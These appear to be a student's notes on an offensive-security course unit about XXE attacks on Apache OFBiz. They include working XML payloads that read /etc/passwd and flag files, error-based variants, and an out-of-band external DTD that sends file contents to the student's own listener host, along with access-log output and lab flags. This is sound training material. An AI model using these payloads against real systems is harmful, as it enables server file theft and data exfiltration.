This Learning Unit covers the following Learning Objectives:

1. Identify an XXE vulnerability
2. Exploit an XXE vulnerability to exfiltrate data
3. Use an error-based XXE payload to exfiltrate data
4. Use an out-of-band XXE payload to exfiltrate data

Let's work through a case study. In this Learning Unit, we'll examine an XXE vulnerability in _Apache OFBiz_,[1](https://portal.offsec.com/courses/web-200-28380/learning/xml-external-entities-30967/testing-for-xxe-31279/out-of-band-testing-31029#fn-local_id_73-1) an open source enterprise resource planning application. Before we start, we'll need to make sure we can access the Apache OFBiz VM.

-----------------------------
#### 10.4.1. Accessing Apache OFBiz

We'll access Apache OFBiz via an /etc/hosts file entry on our Kali Linux VM.

```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.110  ofbiz
```

Let's start the virtual machine below and make the corresponding IP address update on our Kali machine before starting our work. We'll use this VM throughout this entire Learning Unit. 

While XXE injection vulnerabilities can occur anywhere an application interacts with XML input, the vulnerability we will be reviewing is found in the authenticated section of the application. For this reason, we'll be attacking OFBiz as an authenticated user.

##### Labs
![[Pasted image 20240930172428.png]]

![[Pasted image 20240930173430.png]]

-----------

#### 10.4.2. Discovery

We will start by opening Burp Suite and its embedded browser. Next, we'll access the login page at `/accounting/control/main` and log in with the provided credentials. While exploring the application as an admin user, we notice the Web Tools page.
![[Pasted image 20240930173625.png]]

After loading the page, we find that it contains several XML references. Since XML serves as an intermediary between human data and application objects, imports and exports are good targets to test for XXE since they often parse XML.

There are several ways we can import or export XML. Not all applications that handle XML data will have such prominent pages highlighting XML data sources. However, due to XML's natural structure and tags (using "<" and ">"), we can easily identify XML data within HTTP requests or responses with Burp Suite.

During one security engagement, we retrieved a file through directory traversal. However, the file content appeared encoded or encrypted. After closely examining the file, we noticed that every line started with an 'F' and every line ended with 'H'. These repeated characters reminded us of XML since every element starts with "<" and ends with ">". Based on this observation, we wrote a Python script that confirmed the data was ROT10 encoded, a variation of the more common, and equally insecure, ROT13.[1](https://portal.offsec.com/courses/web-200-28380/learning/xml-external-entities-30967/case-study-apache-ofbiz-xxe-vulnerability-31289/discovery-31023#fn-local_id_52-1)

Let's start by trying to export an entity so we have valid XML as our baseline. Ideally, we're searching for an object or entity that is displayed in the application and has a variable or attribute that can handle large strings of data.

We'll begin by clicking on `XML Data Export`, but we find that the `"out to browser"` option does not work.

![[Pasted image 20240930173944.png]]

When we attempt to use the feature, we receive a "java.lang.StackOverflowError" error. In a black box test, we would not have access to local files on the application server so let's find another approach. When we click on `Programmable Export`, we find another page that we can use to export sample Products:

![[Pasted image 20240930174155.png]]

The pre-populated XML at the bottom of the page lists multiple products. Let's examine the structure of one product.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<entity-engine-xml>
	<Product 
		createdStamp="2021-06-04 08:15:49.363" 
		createdTxStamp="2021-06-04 08:15:48.983" 
		description="Giant Widget with Wheels" 
		internalName="Giant Widget variant explosion" 
		isVariant="N" 
		isVirtual="Y" 
		largeImageUrl="/images/products/WG-9943/large.png" 
		lastUpdatedStamp="2021-06-04 08:16:18.521" 
		lastUpdatedTxStamp="2021-06-04 08:16:18.258" 
		longDescription="This giant widget is mobile. It will seat one person safely. The wheels will never rust or break. Quite a unique item." 
		primaryProductCategoryId="202" 
		productId="WG-9943" 
		productName="Giant Widget with variant explosion" 
		productTypeId="FINISHED_GOOD" 
		productWeight="22.000000" 
		quantityIncluded="10.000000" 
		smallImageUrl="/images/products/WG-9943/small.png" 
		virtualVariantMethodEnum="VV_VARIANTTREE"
  />
...
</entity-engine-xml> 
```

The `longDescription` field is a good target for our attempted XXE attack. The application should display that field and can likely handle arbitrary text. However, the XML specification does not allow external entities in attribute values. We will need to restructure the XML to use the _longDescription_ as an element instead as an attribute. The application should still parse the XML as there are no hard rules in the XML specification about when to use elements or attributes. We will also update the _productId_ to make it easier to search for.

```xml
<Product 
  createdStamp="2021-06-04 08:15:49.363" 
  createdTxStamp="2021-06-04 08:15:48.983" 
  description="Giant Widget with Wheels" 
  internalName="Giant Widget variant explosion" 
  isVariant="N" 
  isVirtual="Y" 
  largeImageUrl="/images/products/WG-9943/large.png" 
  lastUpdatedStamp="2021-06-04 08:16:18.521" 
  lastUpdatedTxStamp="2021-06-04 08:16:18.258" 
  primaryProductCategoryId="202" 
  productId="XXE-0001" 
  productName="Giant Widget with variant explosion" 
  productTypeId="FINISHED_GOOD" 
  productWeight="22.000000" 
  quantityIncluded="10.000000" 
  smallImageUrl="/images/products/WG-9943/small.png"   
  virtualVariantMethodEnum="VV_VARIANTTREE"
>
  <longDescription>This giant widget is mobile. It will seat one person safely. The wheels will never rust or break. Quite a unique item.</longDescription>
</Product>
```

Now that we have a baseline object, let's determine if the application's XML parser will parse an entity.

We will focus on the XML Data Import page at `/webtools/control/EntityImport`, which we navigate to by clicking the _XML Data Import_ button. Let's try a simple internal entity to determine if the application is vulnerable to XXE.

The DTD definition is included at the start of the XML data. We will need to update the value of the `longDescription` element to reference the internal entity.

```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```

![[Pasted image 20240930181435.png]]

There is one result. It seems the application did process our XML successfully.

![[Pasted image 20240930181844.png]]

Unfortunately, this page does not include the "longDescription" field. Let's click on the Product ID and then click on `Content`. We may need to scroll down to find the Long Description value.

![[Pasted image 20240930182115.png]]

![[Pasted image 20240930182126.png]]

Very nice. The application processed our payload and updated the Long Description field to the value of our internal entity. Now that we know the application is vulnerable, we will revise our payload to extract data from a file on the server.


--------------
#### 10.4.3. Exploitation

Let's change our payload to an external entity and attempt to access /etc/passwd. We'll switch our browser tab back to the XML Data Import page and update our XML payload to use an external entity as shown below.

```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```

Let's click `Import Text` to submit this payload. After the page refreshes, we'll switch tabs and refresh the product details page.

Excellent! Our XXE attack was successful and the long description field now contains the contents of /etc/password. We were able to use the XXE vulnerability to access files from the server. Note that the user profile running the application will generally dictate which files we can access on the server.

![[Pasted image 20240930184224.png]]

![[Pasted image 20240930184538.png]]

![[Pasted image 20240930184602.png]]

##### Labs
`OS{xxeFlagOne}
![[Pasted image 20240930193235.png]]

```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///root/flag.txt">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0002" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```

![[Pasted image 20240930190241.png]]

![[Pasted image 20240930193005.png]]

![[Pasted image 20240930193142.png]]

---------------

#### 10.4.4. Error-Based Exploitation

In some scenarios we may not be able to directly retrieve the results of our XXE attack. To simulate this, let's modify our attack to use an error-based payload. If the application returns verbose error messages, we want to generate an error that will include the sensitive data from our XXE exploit.

One way to do this is to place the payload in a field that will cause a validation error. For example, the baseline "Product" example includes several attributes containing timestamps. Assuming the application validates the XML values or uses them in a database, the application might throw an error if we include a value in one of those elements that cannot be parsed as a timestamp.

Let's update our exploit payload, moving the "createdStamp" from an attribute to an element and placing our entity reference there. We'll also remove the entity reference from the "longDescription" element.

```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>&xxe;</createdStamp>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```
When we submit this updated payload to the application, we receive an error.
![[Pasted image 20240930205932.png]]

The error message reveals that the application is written in Java, but it does not contain our payload. If the XML parser does not return an error with our payload, perhaps we can target the database by placing our payload in a different field. Instead of causing an error based on data type, let's try to cause an error based on field length.

We'll remove `description` as an attribute and replace it as an element with our external entity reference as its value. We also need to update `createdStamp` with a valid timestamp.

```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>&xxe;</description>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```

![[Pasted image 20240930210242.png]]

Upon closer inspection of the error message in Burp Suite, we find a key component of the error message, which is listed below.

```
A truncation error was encountered trying to shrink VARCHAR
```

![[Pasted image 20240930210432.png]]

Based on the error message and our payload, the application likely tried to insert a string that was too large for the corresponding column in the database. If the contents of the file were short enough to fit in the column, we wouldn't have received this error message and would need to find another way to generate an error.


-----------
##### Labs
This lab gave me an issue due to the field `primaryProductCategoryId` being vulnerable I kept getting an error, however when `URL-ENCODING` the field this solved the issue.
![[Pasted image 20241021195937.png]]

Upon struggling and utilizing discord to find the vulnerable field I was able to come up with this script with `CHATGPT` that will read the `root/error.txt` file 
```XML
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///root/error.txt">  <!-- Change this to the file you want to read -->
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:16:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="&xxe;" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>Check error log</description>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```
I would keep getting this error:
![[Pasted image 20241021200339.png]]
the `xxe` wasnt able to be processed - originally I thought that this wasnt the field. Eventually I thought about `URL-Encoding` the field with this script
- `URL-Encoded` `primaryProductCategoryId="%26xxe;"` 
```XML
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///root/error.txt">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:16:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="%26xxe;" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>Check error log</description>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```
upon submission of we can see that there is an `SQL` error that occurs in burp and on the main screen.
![[Pasted image 20241021200916.png]]
![[Pasted image 20241021200957.png]]
But this doesn't reveal the flag, in order to reveal the flag we have to look for our `ProductID` name in catalog `XXE-0001`
`https://ofbiz:8443/catalog/control/EditProductContent?productId=XXE-0001`
![[Pasted image 20241021201102.png]]
Flag: `OS{IAmError}`



-----------

#### 10.4.5. Out-of-Band Exploitation

n situations where we cannot access the results of our XXE attack or obtain verbose error messages, we can attempt an out-of-band XXE attack. We previously mentioned that external entities can reference resources on other servers. An out-of-band attack leverages this functionality to exfiltrate data as part of the request that loads the external resource.

For this attack to work, we will need to create and host our own DTD file that contains two entities. We will need to use parameter entities because we need the entities to be processed within the DTD so that they can impact each other. Let's create a file named external.dtd with the following content.

`external.dtd`
```xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.45.222/out?%content;'>" >
```

```bash
cd /var/www/html/
sudo mousepad external.dtd
sudo systemctl start apache2
```
The `content` entity defines which file we are targeting. The `external` parameter defines another entity named `exfil`, which appends the `content`entity to a URL.
We'll place this on our Apache webroot at /var/www/html, and start our Apache server.

We will also need to update our payload to use these entities. Since we are using parameter entities, we will need to reference them within the DOCTYPE definition.

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://192.168.45.222/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```

We'll start by including a parameter entity that references external.dtd, the DTD file on our Kali host. Next, we'll reference the _base_ entity, which will cause the parser to load the DTD file from our server and parse it. We will then reference the _external_ entity, which is defined in our remote DTD file. The XML parser will "expand" the _external_ entity, creating the _exfil_ entity. Lastly, we reference the "new" _exfil_ entity, which will cause the parser to attempt to load a resource from our server with the contents of the _content_ entity in the query string.

Unfortunately, when we submit this XML payload, we receive an error from the server.

![[Pasted image 20241021204039.png]]

The application encountered an error while parsing our XML data, but the important part of the error message is `"Illegal character in URL"`. We attempted to append the contents of `/etc/passwd` to a URL. Perhaps there are characters, such as line breaks, within the file that are breaking the URL.

***Other programming languages might be more permissive in what they consider a valid URL.***

We can verify the application requested external.dtd by checking `/var/log/apache2/access.log`.
```bash
┌──(root💀gobots)-[22Oct2024 00:38:53]-[/var/www/html]
└─# tail /var/log/apache2/access.log
192.168.228.110 - - [22/Oct/2024:00:40:15 +0000] "GET /external.dtd HTTP/1.1" 200 433 "-" "Java/1.8.0_292"
```
Let's update `external.dtd` to target a file that is likely one line and has fewer special characters in it. We will target `/etc/timezone`.
```bash
<!ENTITY % content SYSTEM "file:///etc/timezone">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.45.222/out?%content;'>" >
```
We will submit our payload again. We can ignore the error message that pops up. Instead, we'll check our Apache log file.
![[Pasted image 20241021204450.png]]
```bash
┌──(root💀gobots)-[22Oct2024 00:43:31]-[/var/www/html]
└─# tail /var/log/apache2/access.log
192.168.228.110 - - [22/Oct/2024:00:40:15 +0000] "GET /external.dtd HTTP/1.1" 200 433 "-" "Java/1.8.0_292"
192.168.228.110 - - [22/Oct/2024:00:44:22 +0000] "GET /external.dtd HTTP/1.1" 200 435 "-" "Java/1.8.0_292"
192.168.228.110 - - [22/Oct/2024:00:44:22 +0000] "GET /out?Etc/UTC HTTP/1.1" 404 492 "-" "Java/1.8.0_292"
```

Once again the web application requested external.dtd from our Kali host and then made a request for `/out` with the contents of `/etc/timezone` in the query string. While there may be some limits on what data we can access using an out-of-band attack, this is still a very useful technique against a vulnerable parser when other XXE attacks fail.


##### Labs
![[Pasted image 20241021205849.png]]
created new `external.dtd` with vulnerable `.txt`
`external.dtd`
```xml
<!ENTITY % content SYSTEM "file:///root/oob.txt">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.45.222/out?%content;'>" >
```
entered `xml` payload to reach out to my kali machine
```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://192.168.45.222/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```
can see flag here `OS{xxeOOB}`
![[Pasted image 20241021210032.png]]
can also see by running the `access.log`
```bash
┌──(root💀gobots)-[22Oct2024 00:47:43]-[/var/www/html]
└─# tail /var/log/apache2/access.log
192.168.228.110 - - [22/Oct/2024:00:40:15 +0000] "GET /external.dtd HTTP/1.1" 200 433 "-" "Java/1.8.0_292"
192.168.228.110 - - [22/Oct/2024:00:44:22 +0000] "GET /external.dtd HTTP/1.1" 200 435 "-" "Java/1.8.0_292"
192.168.228.110 - - [22/Oct/2024:00:44:22 +0000] "GET /out?Etc/UTC HTTP/1.1" 404 492 "-" "Java/1.8.0_292"
192.168.228.110 - - [22/Oct/2024:00:47:52 +0000] "GET /external.dtd HTTP/1.1" 200 435 "-" "Java/1.8.0_292"
192.168.228.110 - - [22/Oct/2024:00:47:52 +0000] "GET /out?OS{xxeOOB} HTTP/1.1" 404 492 "-" "Java/1.8.0_292"

```